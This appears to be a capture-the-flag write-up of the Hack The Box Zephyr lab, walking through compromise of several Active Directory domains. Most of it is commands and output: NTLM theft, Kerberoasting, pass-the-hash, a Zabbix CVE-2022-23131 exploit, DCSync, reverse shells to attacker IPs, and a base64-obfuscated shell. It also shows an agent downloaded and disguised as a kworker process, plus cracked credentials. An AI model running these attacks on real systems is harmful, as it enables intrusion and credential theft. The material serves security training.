## Detailed Walkthrough
1. Numbered

### Detailed reproduction steps for this attack chain are as follows:

## painters.htb

For enumeration the website it was found to have a user actively reviewing applications for employment among other things such as quotes. May have been vulnerable to back end render, but that was not happening in this case. Attempted ntlm thft by creating a malicious payload that will respond back to the attack host smb server and force it to relay the users hash.
### Greenwolf [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
- Generate Payload
As with other responder tactics use your tun0 VPN IP as the smb server and responder.
```sh
python ntlm_theft.py -g all -s 10.10.14.26 -f painter

# Execute responder
sudo responder -I tun0 -dwv

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events.
```
#### Exploited via ntlm theft
- Upload malicious pdf to `https://painters.htb/listing?id=1` and wait
### Capture NTLMv2 hash and Crack with Hashcat:
```sh
[SMB] NTLMv2-SSP Client   : 10.10.110.35
[SMB] NTLMv2-SSP Username : PAINTERS\riley
[SMB] NTLMv2-SSP Hash     : riley::PAINTERS:2504428420bbbe97:0C3F491008326A4BCA9E0BE262C90958:0101000000000
00080E699F9C0BBDC01D2BFB5D792D9D8E700000000020008004A0039004C00430001001E00570049004E002D004D00350052004900300041004A00490059005100370004003400570049004E002D004D00350052004900300041004A0049005900510037002E004A0039004C0043002E004C004F00430041004C00030014004A0039004C0043002E004C004F00430041004C00050014004A0039004C0043002E004C004F00430041004C000700080080E699F9C0BBDC01060004000200000008003000300000000000000000000000002000003DEE50E27C2EE2A4869BAE08DBA25E3856C727735304A3B5A8DB42923CEB88DA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320036000000000000000000
```
```sh
hashcat -m 5600 hashes/riley.hash /opt/wordlists/rockyou.txt

RILEY::PAINTERS:2504428420bbbe97:0c3f491008326a4bca9e0be262c90958:010100000000000080e699f9c0bbdc01d2bfb5d792d9d8e700000000020008004a0039004c00430001001e00570049004e002d004d00350052004900300041004a00490059005100370004003400570049004e002d004d00350052004900300041004a0049005900510037002e004a0039004c0043002e004c004f00430041004c00030014004a0039004c0043002e004c004f00430041004c00050014004a0039004c0043002e004c004f00430041004c000700080080e699f9c0bbdc01060004000200000008003000300000000000000000000000002000003dee50e27c2ee2a4869bae08dba25e3856c727735304a3b5a8db42923ceb88da0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320036000000000000000000:P@ssw0rd
```
## MAIL - as Riley 
### Access
Success SSH login:
```sh
~/Documents/projects/zephyr/tmp main ?1                                     INT py paramspider 04:06:57 PM
> ssh riley@10.10.110.35

Last login: Tue Mar 24 22:33:59 2026 from 10.10.16.6
riley@mail:~$ whoami
riley
riley@mail:~$ id
uid=1003(riley) gid=1003(riley) groups=1003(riley)
```
### Database Password Found
Upon intitial enumeration of the website the database credentials were found hard coded:
`/var/www/painter/models/DatabaseModel.php`

```php
define("DB_HOST", "localhost");
define("DB_NAME", "painter");
define("DB_CHARSET", "utf8");
define("DB_USER", "riley");
define("DB_PASSWORD", "PainterDBPassword2022");
```

- Was able to use the password to log into mysql and retrieve an admin hash
```mysql
MariaDB [painter]> SELECT username, password FROM users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$7BLIFYjCq4PF0U3ZH86b1eQLfO9EEIO.GRQMKM5XX02FAbBFd95j2 |
+----------+--------------------------------------------------------------+
```

- Attempts to crack failed failed mostly due to limited environmental knowledge to create a detailed targeted word list. CeWl was used to crawl the website and generate key words:
#### Cracking word lists (Optional)
```sh
# Cewl list generation
cewl -d 1 -m 2 --with-numbers https://painters.htb > target_initial.txt
cewl -d 3 -m 2 https://painters.htb > target_extended.txt
cat target_initial.txt target_extended.txt > combined_wordlist.txt

# With rules
hashcat -m 3200 admin.hash password -r /opt/wordlists/rules/append/appendYear.rule /opt/wordlists/rules/append/append_sym.rule
```
### Painters domain
- Found box linked to network 192.168.110/24
```sh
riley@mail:~$ for i in {1..254} ;do (ping -c 1 192.168.110.$i | grep "bytes from" &) ;done
64 bytes from 192.168.110.1: icmp_seq=1 ttl=64 time=0.550 ms
64 bytes from 192.168.110.51: icmp_seq=1 ttl=64 time=0.021 ms
64 bytes from 192.168.110.52: icmp_seq=1 ttl=128 time=1.49 ms
64 bytes from 192.168.110.53: icmp_seq=1 ttl=128 time=0.918 ms
64 bytes from 192.168.110.54: icmp_seq=1 ttl=128 time=2.02 ms
64 bytes from 192.168.110.55: icmp_seq=1 ttl=128 time=1.85 ms
```
#### Staging
This is the first pivot into Zephyr's domain. While Riley only has user level access we can still pivot into the Painters domain using a Ligolo tunnel. Matt has been flagged from enumeration to have sudo writes over this landing to further compromise domain.
- Add rout to ligolo via attack box, you will need the secon one latter so load it into your proxy script or add it from termiminal
```sh
sudo ip route add 192.168.210.0/24 dev ligolo
sudo ip route add 192.168.210.0/24 dev ligolo2
```
## WORKSTATION-1 - as Riley
### Access
Riley's creds were re-used to access winrm using evil-winrm
```sh
evil-winrm -i 192.168.110.56 -u 'painters.htb\riley' -p 'P@ssw0rd' -s /opt/win_tools/scripts
```
#### Admin password found in Riley' documents `automate.py`
```python
url = "https://painters.htb/administration"
username = "admin"
password = "Mail4Painter2022!@#"
```

- Nothing else useful
## DC - as Riley
### Bloodhound Data
- Riley is a domain user and is authorized for ldap and smb
- Pulled user information, domain data
```sh
bloodhound-ce-python -u 'riley' -p 'P@ssw0rd' -ns 192.168.110.55 -d painters.htb -c all --zip

ad-reaper.py 192.168.110.55 -u web_svc -p '!QAZ1qaz' --spider-shares
```
### Kerberoasting SPNs
- 2 users are kerberoastable `web_svc` and `blake`
- `ad-reaper.py` automated this, but reviewing domain data in bloodhound and doing a targeted roast with impacket `GetNPUsers.py` for SPN accounts works as well
```sh
GetNPUsers.py painters.htb/riley -dc-ip 192.168.110.55 -usersfile ../../users.txt -outputfile asrep.hashes
```
#### Cracking hashes
- user `web_svc` was easily cracked with `rockyou.txt`
```sh
hashcat -m 13100 reaper-logs/kerberoast_hashes.txt /opt/wordlists/rockyou.txt

$krb5tgs$23$*web_svc$PAINTERS.HTB$PAINTERS.HTB/web_svc*$22cb4fde95d21a8f4fd04622e< SNIP> bda1bd98bc29b2425e29261168f5a3842ad21d4fea44c37d2925a7ecd39f469b98ee193:!QAZ1qaz
```

- Attempted multiple, mutated and custom word lists against `blake` without success
```sh
hashcat -m 13100 -a 1 blake.hash us_tv_and_film.txt passwords.txt
hashcat -m 13100 blake.hash passwords.txt -r best64.rule
hashcat -m 13100 blake.hash rockyou.txt -r rockyou-30000.rule
```

## PNT-SVRSVC - as web_svc
### System pwned with cracked hash
```sh
> nxc smb 192.168.110.52 -u 'web_svc' -p '!QAZ1qaz'
[+] painters.htb\web_svc:!QAZ1qaz (Pwn3d!)
```
- Sprayed hashes and found James has local access to machine `PNT-SVRBPA`
```sh
nxc smb 192.168.110.53-56 -u 'James' -H '8af1903d3c80d3552a84b6ba296db2ea' --local-auth

[+] PNT-SVRBPA\James:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)
```

## PNT-SVRBPA as James
Bloodhound reported that this Machine can change user Blake password via ForceChangePassword ACL.
### Access
- James' hash for winrm access
```sh
- [+] PNT-SVRBPA\James:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)
```
### Password change on Blake
`net rpc` failed due to James only being a local administrator, but using psexec and using the machine to bypass ldap checks and change blake's password:
```sh
psexec.py -hashes ':8af1903d3c80d3552a84b6ba296db2ea' james@192.168.110.53
```
- Blakes password change with mimikatz:
```powershell
lsadump::setntlm /server:painters.htb /user:blake /password:Password@9876
```
#### Alternative but decrepit
```sh
pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
```
## DC - as Blake
### Access
Since `Blake` has constrain delegations (allowedtodelegatto) against `DC` for CIFS we are able to craft a kerberos ticket to impersonate administrator against that service, and that service only which will give us the ability to perform a DCsync.

- getting ticket with new credentials:
```sh
getST.py painters.htb/blake:'Password@9876' -spn CIFS/dc.painters.htb -impersonate administrator -altservice 'cifs' -dc-ip 192.168.110.55
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Changing service from CIFS/dc.painters.htb@PAINTERS.HTB to cifs/dc.painters.htb@PAINTERS.HTB
[*] Saving ticket in administrator@cifs_dc.painters.htb@PAINTERS.HTB.ccache

# export ticket
export KRB5CCNAME=administrator@cifs_dc.painters.htb@PAINTERS.HTB.ccache
```
### DCsync
- The ticked was for admin but CIFS access only so winrm and running remote commands was not an option, but secrets dump has the ability to perform VSS in CIFS mode to Dcsync

```sh
secretsdump.py -k -no-pass 'painters.htb/administrator'@dc.painters.htb
```
#### Creds
```sh
[*] Dumping cached domain logon information (domain/username:hash)
PAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2024-12-11 15:06:55
```

Next domain found from enumeration on the 192.168.210.0/24 network
## PNT-MAIL as Matt
### Root access
Successful ssh as matt using plain text credentials from dcsync
```sh
ssh matt@10.10.110.35
L1f30f4Spr1ngCh1ck3n!
```
### Privsec
Matt has full sudo privs
```sh
Matching Defaults entries for matt on mail:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User matt may run the following commands on mail:
    (ALL : ALL) ALL
```
- root flag.txt
```sh
> cat /root/flag.txt
ZEPHYR{L34v3_N0_St0n3_Un7urN3d}
```

From here we can create a ligolo tunnel as root and have the ability to forward ports to compromise other domains on the network. There is no need to tunnel from the DC as the landing zone is the intent and Linux is far more stable and the landing is easier to access if needed to return or if you loose the tunnel.
### First Jump onto the 192.168.210.0/24 network
#### Bypass Firewall restrictions and jump
setup you ligolo proxy server start http server, and transfer and execute agent:
```sh
curl -L http://10.10.14.22/agent -o /dev/shm/kworker && chmod +x /dev/shm/kworker && (exec -a "[kworker/u2:1]" /dev/shm/kworker -connect 10.10.14.22:53 -ignore-cert >/dev/null 2>&1 &); sleep 2; rm /dev/shm/kworker
```
 Add routs for second network back on attack host:
 ```sh
 sudo ip route add 192.168.210.0/24 dev ligolo2
 ```

## ZSM.LOCAL and INTENAL.ZSM.LOCAL
You can immediately use your domain admin credentials from `painters.htb` domain to pull bloodhound data from `zsm.local` and `internal.zsm.local`. Which will give you 2 high value user targets, `Jamie` for `zsm.local` and `Melissa` for `internal.zsm.local`

User `Aron` pass can be gained from his user description in `ldap` data, spraying for password re-use will indicate a hist for the service account user `mssql_svc`

From the painters domain all access will be limited to `smb` which will provide no information or useful shares.
## ZPH-ZABBIX - Foothold on zsm.local domain
Zabbix server was identified on the 192.168.210.0/24 network as 192.168.210.13. Zabbix is a server management agent and our only Linux machine accessible on this network so it is likely used as our second pivot.
### Identify Zabbix version
#### Fingerprinting
```sh
curl -k https://192.168.210.13/zabbix.php | grep -E 'Zabbix|version|Server:'
```
#### CVE
Found machine AKA Zabbix running version 5.4.8 which is vulnerable to CVE-2022-23131 through SAML OAuth. 
```text
CVE-2022-23131 – Unsafe client-side session storage leading to authentication bypass/instance takeover via Zabbix Frontend with configured SAML
Affected versions: 5.4.0 – 5.4.8; 6.0.0alpha1
```
### Exploit - kh4sh3i
The basic explination of this exploit and it can be done manualy is when zabbix requests oauth from the federation server it includes it's own admin session cookie for adfs to verify it's identity for authorization, we can then intercept the cookie and load it into out zabbix session and gain admin access.
#### Clone git
```sh
git clone https://github.com/kh4sh3i/CVE-2022-23131.git
cd CVE-2022-23131
```
#### Execute exploit
This is where things get a touch tricky, you will need to proxy through burp or zap to intercept the request sent by zabbix to ADFS, in that request is the admin session cookie
- Execute script, you will need to SAML as Admin to grab his cookie:
```sh
python3 zabbix_session_exp.py -t https://192.168.210.13/ -u Admin -p http://localhost:8181
```
#### Check proxy logs in burp to copy captured cookie
The script will tell you it failed to log in but if you check the proxy gistory you will see a zabbix_session cookie in the request made by the script, takie it and inject cookie into Zabbix session and click login via OAuth and you in as Admin
## ZABBIX -  as root
### Abusing admin privs to gain shell as root
You can gain a reverse shell by modifying or adding scripts in the administration page, check Monitoring -> Hosts to see what ones are active and available to send reverses to.
- Firewall may be locked down, I found port **445** worked.
#### Python reverse shell
Check Monitoring Hosts to see which server is running Zabbix, whether it is on Proxy or Server, pnce identified got to Adminstration -> Scripts and create a manual execution script fro Zabbix Server
```python
python3 -c 'import socket,os,subprocess;
s=socket.socket();s.connect(("192.168.110.51",445));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
subprocess.call(["/usr/bin/bash","-i"]);'
```

Setup listener and go back to Monitoring -> Hosts and execute script to gain a shell as zabbix user 
#### Sudo while in lower level session needs sudo
Zabbix user has sudo no pass over nmap, we can exploit this on nmap v 7.8.0 by creating a lua script and executing it with nmap, this will re-use out exisitng connection
##### Re-uses existing reverse-shell session
```bash
echo 'os.execute("nohup /bin/bash -p -c \"while true; do bash -i >& /dev/tcp/192.168.110.51/4444 0>&1; sleep 5; done\" > /dev/null 2>&1 &")' > /tmp/nse_main.lua && sudo /usr/bin/nmap -sC --datadir=/tmp 127.0.0.1
```
### Alternative one shot shell as root
Zabbix scripts are extremely picky as it's executing through a non interactive sh session, this can be further bypass for abuse straight into root use base64 encode.
#### Payload
```sh
echo 'ZWNobyAnb3MuZXhlY3V0ZSgibm9odXAgL2Jpbi9iYXNoIC1wIC1jIFwid2hpbGUgdHJ1ZTsgZG8g
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMC41MS80NDUgMD4mMTsgc2xlZXAgNTsgZG9u
ZVwiID4gL2Rldi9udWxsIDI+JjEgJiIpJyA+IC90bXAvbnNlX21haW4ubHVhICYmIHN1ZG8gL3Vz
ci9iaW4vbm1hcCAtc0MgLS1kYXRhZGlyPS90bXAgMTI3LjAuMC4xCg==' | base64 -d | bash
```
### Enumeration
#### SQL
- Database login found in zabbix.conf
```sh
$DB['TYPE']				= 'MYSQL';
$DB['SERVER']			= 'localhost';
$DB['PORT']				= '0';
$DB['DATABASE']			= 'zabbix';
$DB['USER']				= 'zabbix';
$DB['PASSWORD']			= 'rDhHbBEfh35sMbkY';
```
- Extracted users hashes from `zabbix` database
```mysql
+----------+--------------------------------------------------------------+
| username | passwd                                                       |
+----------+--------------------------------------------------------------+
| Admin    | $2y$10$BH90bGVo2lv948WpM1haruzrBgVCpzEL5av9BPCewd/Q2pM1Ybl.q |
| guest    | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |
| marcus   | $2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4. |
+----------+--------------------------------------------------------------+
```
- cracked user `marcus` hash
```sh
> hashcat -m 3200 ../logs/ZABBIX/mysql.hashes /opt/wordlists/rockyou.txt --show
$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.:!QAZ2wsx
```
Now you can jump into the second network with more access to the zsm.local domain, particuarily having the ability to use winrm which was restricted in the painters.htb domain. A bit different of a jump as we need to get around firewall restrictions:
### Ligolo quick setup
Forward ports, transfer agent, stop listener, re forward ports and execute
```sh
# On ligolo
> listener_add --addr 0.0.0.0:445 --to 0.0.0.0:80

# Transfer Agent
> curl -L http://192.168.110.51/agent -o /dev/shm/kworker && chmod +x /dev/shm/kworker

# Back on Ligolo forward http 80 (is open on zabbix)
> listener_add --addr 0.0.0.0:445 --to 0.0.0.0:445

# Execute
> /dev/shm/kworker -connect 192.168.110.51:445 -ignore-cert &

# Reroute networks on tun interface
> sudo ip route del 192.168.210.0/24 dev ligolo
> sudo ip route add 192.168.210.0/24 dev ligolo2
```

We now have winrm access to enumerated machines on root domain zsm.local and most others on the child domain linternal.zsm.local.
## MGMT1 - as Matt and Jamie takeover

### Chain AddCredentialLink -> AddGroupMember -> ForceChangePassword

Jamie as` AdminCount=1` given he is or was in the administrator group. We have control of Marcus which as `AddCredentialLink` to the machine `MGMT1`, which can add members to the group `General Management` which has the oubound object control ACL to `ForceChangePassword` For Jamie.
### Step 1: Add the Shadow Credential (`pyWhisker`)
You will need `pyWhisker` for this. It automates the generation of the certificate and the modification of the LDAP attribute. Run this using Marcus's credentials:
```sh
pywhisker -d "zsm.local" -u "marcus" -p '!QAZ2wsx' -t "ZPH-SVRMGMT1$" -a "add" -f "mgmt1.pfx" --dc-ip 192.168.210.10
[*] Must be used with password: VEFN0qPzn7zuwbbpUDqP
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
- When this finishes, it will print a randomly generated password to your screen for the `.pfx` file. **Save that password**, and you will now have a file named `mgmt1.pfx` in your directory.
### Step 2: Request the TGT (`PKINITtools`)
Now that the Domain Controller trusts your certificate for that computer account, you use `gettgtpkinit.py` (from the PKINITtools suite) to ask for a Ticket Granting Ticket (TGT).
```sh
python3 gettgtpkinit.py -cert-pfx mgmt1.pfx.pfx -pfx-pass 'VEFN0qPzn7zuwbbpUDqP' 'zsm.local/ZPH-SVRMGMT1$' mgmt1.ccache
```
- This will download `mgmt1.ccache` and print an `AS-REP encryption key` to your terminal. Copy that encryption key!
### Step 3: Extract the Machine Account Hash
While you could use the `.ccache` ticket directly, it is usually much easier to just extract the raw NTLM hash of the `ZPH-SVRMGMT1$` machine account so you can pass-the-hash with standard tools.
```sh
python3 getnthash.py -key '521d4ee29d3120c93207c2a383969f66229d857187e1e62f73cb8561ff38dd09' 'zsm.local/ZPH-SVRMGMT1$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
89d0b56874f61ad38bad336a77b8ef2f
```
### Step 4: Add Marcus to General Management
You will authenticate to the Domain Controller as the `ZPH-SVRMGMT1$` computer account, and use its privileges to shove `marcus` into that group.
```sh
net rpc group addmem "General Management" "marcus" -U 'zsm.local'/'ZPH-SVRMGMT1$'%'89d0b56874f61ad38bad336a77b8ef2f' -S 192.168.210.10
```
### Step 5: Reset Jamie's Password
Now that you have the NTLM hash for `ZPH-SVRMGMT1$`, you have the `ForceChangePassword` rights over Jamie.
```sh
net rpc password 'jamie' 'Winter2026!' -U 'zsm.local'/'ZPH-SVRMGMT1$'%'89d0b56874f61ad38bad336a77b8ef2f' -S 192.168.210.10
```
### Step 5. Take control of `CA Managers` group and `SVRCA01`
Jamie has the ability to `AddGroupMember` to the `CA Managers` group which will give use access to enumerate the CA authority with `certipy` so we can check for abuse or ESC exploits to furthe advance or take over domain. This also give use access to the `SVRCA01` server.
#### 1. Check CA-Level Permissions (ESC7)
Active Directory Certificate Services (ADCS) has its own internal ACLs separate from standard Active Directory. We need to see if the `CA Managers` group has rights to manage the CA server itself (specifically the `ManageCA` or `ManageCertificates` rights).

Since Jamie is a local admin on `MGMT1`, log in there and run this native Windows command to dump the CA's access control list:
```sh
certutil -config "ZPH-SVRCA01.zsm.local\zsm-ZPH-SVRCA01-CA" -ca.acl
```
#### 2. Check Template-Level Permissions (ESC4)
If Jamie doesn't have rights over the CA server itself, he might have rights over the _Certificate Templates_ stored in Active Directory. If `CA Managers` has `Write` access to a template, Jamie can modify it to make it vulnerable to domain escalation (like allowing Client Authentication and supplying a Subject Alternative Name).
```sh
certipy find -u 'jamie@zsm.local' -p 'Winter2026!' -dc-ip 192.168.210.10 -vulnerable
```
#### 3. Native AD Query (If Certipy fails)
If you want to live off the land and query the template permissions directly from your `MGMT1` shell, drop into PowerShell and run this to see the ACLs on the Certificate Templates container:
```powershell
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() $context = $domain.GetDirectoryEntry().ConfigurationNamingContext $path = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$context" $acl = (Get-Acl $path).Access $acl | Where-Object { $_.IdentityReference -match "CA Managers" } | Format-List
```

Unfortunately this was a dead end, but still useful information had it not been.
### Chrome Password found:
Melissa credentials found in user marcus chrome password vault
#### Passwords Decrypted with Viper One
`https://github.com/The-Viper-One/Invoke-PowerChrome`
```powershell
PS C:\Users\marcus\appdata\local\google\chrome\User Data> Invoke-PowerChrome -Browser Chrome

Target                        Username Password
------                        -------- --------
https://zephyr.atlassian.htb/ melissa  WinterIsHere2022!
```

```powershell
https://zephyr.bamboohr.htb/
https://zephyr.atlassian.htb/
```

## SVCSQL01 - as Jamie

`Jamie` can access mssql via remote but will only be logged in as a guest user, enumeration would indicate a custom db named `zabbix_hosts` which is inaccessible.
### MSSQL Data
Access to the `zabbix_hosts` DB can be gained by remoting into the server with `jamie`, enumeration would indicate that while not in the administrators group he does have control over the mssql service. We can then shut the service down and restart in a local repair instance that will give us all `SA` rights over that instance
#### Restart MSSQL
```powershell
net stop MSSQLSERVER
net start MSSQLSERVER /m"SQLCMD"
```
#### Retrieve zabbix_hosts data
This will relieve a couple hidden hosts not available in ping sweeps or syn scans, one of which `SVRSUP` which will be useful later:
```sql
> sqlcmd -S . -E -Q "USE zabbix_hosts; SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'hosts';"

id hostname ip_address network_name
-- -------- ---------- ------------
1 ZABBIX.ZSM.LOCAL 192.168.210.13 ZEPHYR
2 ZPH-SVRDC01.ZSM.LOCAL 192.168.210.10 ZEPHYR
3 ZPH-SVRADFS1.ZSM.LOCAL 192.168.210.14 ZEPHYR
4 ZPH-SVRCA01.ZSM.LOCAL 192.168.210.12 ZEPHYR
5 ZPH-SVRSQL01.ZSM.LOCAL 192.168.210.15 ZEPHYR
6 ZPH-SVRCDC01.INTERNAL.ZSM.LOCAL 192.168.210.16 INTERNAL.ZEPHYR
7 ZPH-SVRCHR..INTERNAL.ZSM.LOCAL 192.168.210.17 INTERNAL.ZEPHYR
8 ZPH-SVRCSUP.INTERNAL.ZSM.LOCAL 192.168.210.18 INTERNAL.ZEPHYR
9 DC.PAINTERS.HTB 192.168.110.55 PAINTERS
```
## internal.zsm.local - Domain Admin

There are multiple ways to go about enumerating and getting `Domain Admin` access to this domain. In my route I found user `melissa` was in the `Backup Operators` group but had no winrm access and was limited to CIFS. Here is what I thought would have been the intended path and the exploit I used to backup the registry remotely and then doing dcsync.
### SVRCHR as Aron
#### Host scan
Run a host scan from powershell session and you will discover that this machine has access to the `SVRSUP` machine. Suggest not running a ping sweep but a targeted port scan for accessible hosts:
```powershell
10..20 | % { $ip = "192.168.210.$_"; $tcp = New-
Object System.Net.Sockets.TcpClient; $connect = $tcp.BeginConnect($ip, 445, $null, $null); $wait = $connect.AsyncWaitHandle.WaitOne(200, $false); if ($tcp.Connected) { Write-Host "SMB Open: $ip" -ForegroundColor Yellow; $tcp.EndConnect($connect) }; $tcp.Close() }
SMB Open: 192.168.210.10
SMB Open: 192.168.210.11
SMB Open: 192.168.210.12
SMB Open: 192.168.210.14
SMB Open: 192.168.210.15
SMB Open: 192.168.210.16
SMB Open: 192.168.210.17
SMB Open: 192.168.210.18
SMB Open: 192.168.210.19
```
#### Tunnel into SVRSUP
Setup a ligolo agent on SVRCHR as `aron` and forward port 5985 to 192.168.210.19
```sh
session
# Select the Session ID for Host 17
listener_add --addr 0.0.0.0:5985 --to 192.168.210.19:5985
```
##### Or chisel
```sh
# Attack host
./chisel server -v -p 12855 --socks5

# On SVRHR
.\chisel.exe client -v 10.10.14.22:445 R:socks
```

Wen I first did the lab, either someone had tampered with the routing tables on `SVRHR` or the labs routing was broken as I was able to access `SVRSUP` without having to create a 3rd jump. Upon another entry into the lab I discovered that the host was isolated through virtual networking and only accessible through `SVCHR`
#### SVCSUP as Melissa
Here `melissa`  has full administrator privileges where you can shutdown AV solutions and execute a remote backup of the registry on the DC `SVRDCD01` controller for `internal.zsm.local` using
##### [BackupOperator2DA](https://github.com/mpgn/BackupOperatorToDA) by mpgn
```powershell
.\BackupOperatorToDA.exe -t \\192.168.10.16 -o C:\temp
```

- Transfer over reg backup and extract secrets:
```sh
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```
### Alternative (my method)
As soon as you get `melissa` creds with marcus from `MGMT1` you can quicky own the entire lab. This can be done without having to pivot from `SVRHR` or having to execute from `SVRSUP`. If you can bypass the virtual routing this can done without NT/AUTHORITY in both child and root domains :/.
#### `horizon3ai`'s Modified `reg.py`
**1. Start an open SMB server on your attack box:**
```sh
sudo impacket-smbserver share . -smb2support
```

**2. Clone the modified Python script:**
```sh
git clone https://github.com/horizon3ai/backup_dc_registry.git
cd backup_dc_registry
```

**3. Run it and point the save path to your Ligolo Tun IP:**
- Use tun0 IP and not pivot
```sh
# Forward port in ligolo
listener_add --addr 0.0.0.0:445 --to 0.0.0.0:445

python3 reg.py 'internal.zsm.local/melissa':'WinterIsHere2022!'@192.168.210.16 backup -p '\\10.10.14.22\share'
```

**4. Crack the hives locally:**
Once the `SAM` and `SYSTEM` files drop into your Kali folder, parse them with standard Impacket:
```sh
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```
Local machine Hash:
```sh
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948
```
### DCsync intenal.zsm.local
Using the MACHINE.ACC NTLM I was able to secrets dump the domain:
```sh
secretsdump.py 'internal.zsm.local/ZPH-SVRCDC01$'@192.168.210.16 -hashes aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0540fe51ddd618f42a66ef059ac36441:::
```

## zsm.local - Domain Admin

This was a bit tricky, and required a few sanity checks along the way. `ticketer.py` and `raisechild.py` both failed to create valid tickets for `zsm.local` domain, while attempting to use both `ntlm` and `aes256` `krbtgt` keys. Not sure how but I'll need to look into how `netexec` was able to do it easily using its `raisechild` module, note that `aes256` etype will need to be used:

```sh
nxc ldap 192.168.210.16 -u administrator -H 543beb20a2a579c7714ced68a1760d5e -M raisechild -o ETYPE=aes256

# Explort ticket
export KRB5CCNAME=Administrator.ccache

# Pwned
nxc smb 192.168.210.10 --use-kcache
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] INTERNAL.ZSM.LOCAL\Administrator from ccache (Pwn3d!)

nxc smb 192.168.210.10 --use-kcache --shares --ntds
```

### Secrets:
```sh
Administrator:500:aad3b435b51404eeaad3b435b51404ee:84210eddc5724a7801fe78289ee94d44:::
```